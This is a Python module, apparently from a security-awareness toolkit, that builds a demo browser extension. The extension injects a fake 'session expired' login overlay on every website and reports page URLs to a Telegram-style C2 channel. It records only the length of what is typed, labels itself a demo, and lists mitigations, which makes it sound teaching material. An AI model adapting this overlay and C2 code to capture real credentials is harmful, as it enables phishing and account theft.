from .base import BasePayload, Payload


class PhishingOverlay(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="phishing_overlay",
            name="Phishing Overlay",
            description=(
                "Показывает фишинговый оверлей поверх любого сайта. "
                "Демонстрирует, как атакующий может подменить UI."
            ),
            icon="🎣",
            risk_level="critical",
            permissions=["<all_urls>", "storage"],
            targets=[
                "login pages",
                "payment forms",
                "banking portals",
                "email clients",
                "social media",
            ],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Откройте любой сайт\n"
                "3. Поверх появится оверлей\n"
                "4. Проверьте, как легко не заметить подмену"
            ),
            mitigation=[
                "Всегда проверяйте URL перед вводом данных",
                "Используйте менеджер паролей — он не заполняет формы на неправильных доменах",
                "Используйте аппаратные ключи безопасности",
                "Не игнорируйте предупреждения браузера",
                "Проверяйте сертификат сайта",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Phishing Overlay — C2
// ============================================================

console.log('[DEMO] Phishing Overlay: background loaded');

let overlaysShown = 0;

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'overlay_shown') {
        overlaysShown++;
        chrome.action.setBadgeText({ text: String(overlaysShown) });
        chrome.action.setBadgeBackgroundColor({ color: '#F44336' });
        chrome.storage.local.set({ demo_overlays_count: overlaysShown });

        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            c2Send(
                `🎣 <b>Phishing Overlay</b>\n` +
                `Сессия: <code>${C2_CONFIG.sessionId}</code>\n` +
                `Оверлей показан на: <code>${c2Escape(sender.tab?.url || '')}</code>`
            );
        }
        sendResponse({ status: 'ok' });
    }

    if (msg.action === 'overlay_data') {
        // ДЕМО: данные НЕ отправляются в Telegram.
        // Оверлей — только визуальная демонстрация.
        console.log('[DEMO] Overlay form submitted (demo only, not sent)');

        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            c2Send(
                `🎣 <b>Phishing Overlay</b>\n` +
                `Сессия: <code>${C2_CONFIG.sessionId}</code>\n` +
                `⚠️ Пользователь ввёл данные в оверлей на ` +
                `<code>${c2Escape(msg.url || '')}</code>\n` +
                `<i>(данные не передаются — это демонстрация)</i>`
            );
        }
        sendResponse({ status: 'ok' });
    }

    if (msg.action === 'get_overlay_stats') {
        chrome.storage.local.get(['demo_overlays_count'], (data) => sendResponse(data));
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
// ============================================================
// Phishing Overlay — Content Script
// Показывается на ВСЕХ сайтах.
// ============================================================

console.log('[DEMO] Phishing Overlay: content loaded on', location.hostname);

// Небольшая задержка, чтобы страница успела загрузиться
setTimeout(showOverlay, 1500);

function showOverlay() {
    // Не показываем дважды
    if (document.getElementById('demo-phishing-overlay')) return;

    // Не показываем на страницах самого браузера
    if (location.protocol === 'chrome:' ||
        location.protocol === 'about:' ||
        location.protocol === 'moz-extension:' ||
        location.protocol === 'chrome-extension:') {
        return;
    }

    const overlay = document.createElement('div');
    overlay.id = 'demo-phishing-overlay';
    overlay.innerHTML = `
        <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.75);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
            <div style="background:white;padding:32px;border-radius:12px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
                <div style="text-align:center;margin-bottom:20px;">
                    <div style="font-size:48px;">🔐</div>
                    <h2 style="margin:12px 0 4px;color:#333;">Сессия истекла</h2>
                    <p style="color:#666;font-size:14px;margin:0;">Для продолжения необходимо войти снова</p>
                </div>
                <form id="demo-phishing-form">
                    <input type="text" name="username" placeholder="Email или телефон"
                        style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #DDD;border-radius:8px;box-sizing:border-box;font-size:14px;">
                    <input type="password" name="password" placeholder="Пароль"
                        style="width:100%;padding:12px;margin-bottom:16px;border:1px solid #DDD;border-radius:8px;box-sizing:border-box;font-size:14px;">
                    <button type="submit"
                        style="width:100%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;">
                        Войти
                    </button>
                </form>
                <p style="text-align:center;font-size:11px;color:#999;margin:12px 0 0;">
                    [DEMO] Это демонстрация фишинга.<br>
                    Данные не передаются. Проверяйте URL!
                </p>
                <button id="demo-phishing-close"
                    style="position:absolute;top:12px;right:12px;background:transparent;border:none;font-size:20px;cursor:pointer;color:#999;">
                    ✕
                </button>
            </div>
        </div>
    `;

    document.body.appendChild(overlay);

    // Кнопка закрытия
    document.getElementById('demo-phishing-close').addEventListener('click', () => {
        overlay.remove();
    });

    // Обработка формы
    document.getElementById('demo-phishing-form').addEventListener('submit', (e) => {
        e.preventDefault();

        // ДЕМО: НЕ отправляем данные.
        // Только уведомляем, что пользователь ввёл данные.
        const formData = new FormData(e.target);
        const fields = {};
        for (const [k, v] of formData.entries()) {
            // Сохраняем только факт ввода, не значение
            fields[k] = `[${String(v).length} chars]`;
        }

        console.log('[DEMO] Overlay submitted:', fields);

        chrome.runtime.sendMessage({
            action: 'overlay_data',
            url: location.href,
            fields: fields,
        });

        alert(
            '[DEMO] Это была демонстрация фишинга!\n\n' +
            'В реальной атаке ваши данные были бы украдены.\n\n' +
            'Проверяйте URL перед вводом данных.'
        );

        overlay.remove();
    });

    chrome.runtime.sendMessage({ action: 'overlay_shown' });
}
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_overlay_stats' }, (data) => {
    if (data && data.demo_overlays_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_overlays_count;
    }
});
"""


__all__ = ["PhishingOverlay"]
